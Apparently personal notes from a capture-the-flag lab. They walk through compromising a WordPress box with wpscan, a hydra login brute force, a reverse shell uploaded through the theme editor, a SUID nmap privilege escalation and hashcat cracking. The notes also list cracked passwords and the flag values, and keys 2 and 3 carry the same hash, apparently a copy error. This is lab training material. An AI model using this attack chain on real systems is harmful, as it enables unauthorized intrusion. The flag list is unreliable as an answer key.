# IP=10.10.234.229

/robots.txt: fsocity.dic, key-1-of-3.txt

Wordpress: wpscan --url http://$IP
- Wordpress 4.3.1
- Twentyfifteen 
- /readme.html: I like where you head is at. However I'm not going to help you. 
- /phpmyadmin
- /fsocity.dic (wordlist)

//
//
# KEY 1
- /key-1-of-3.txt:
	073403c8a58a1f80d943455fb30724b9
//
//

sort fsocity.dic | uniq > new

wp-admin pwn: hydra -l elliot -P fsocity.dic -s 80 -t 30 $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.234.229%2Fwp-admin%2F&testcookie=1:incorrect'

//
# ELLIOT PWD:
elliot:ER28-0652
//

navigate to /wp-login.php
- Logged in 
- Appearance -> Editor -> 404.php
- Upload reverse shell
- nc -lvnp 4444
- Navigated to http://$IP/wp-content/themes/twentyfifteen/404.php
- In shell: python -c 'import pty;pty.spawn("/bin/bash")'
- find / -perm -u=s -type f 2>/dev/null
- ./usr/local/bin/nmap --interactive
- !sh
- cat /root/key-3-of-3.txt
- cat /home/robot/key-2-of-3.txt
- cat /home/robot/password.raw-md5

//
# ROBOT MD5 HASH:
robot:c3fcd3d76192e4007dfb496cca67e13b

to crack... hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt

# ROBOT PWD:
robot:abcdefghijklmnopqrstuvwxyz
//

//
//
# KEY 2:
- /key-2-of-3.txt:
	822c73956184f694993bede3eb39f959
//
//

//
//
# KEY 3:
- /key-3-of-3.txt:
	822c73956184f694993bede3eb39f959
//
//
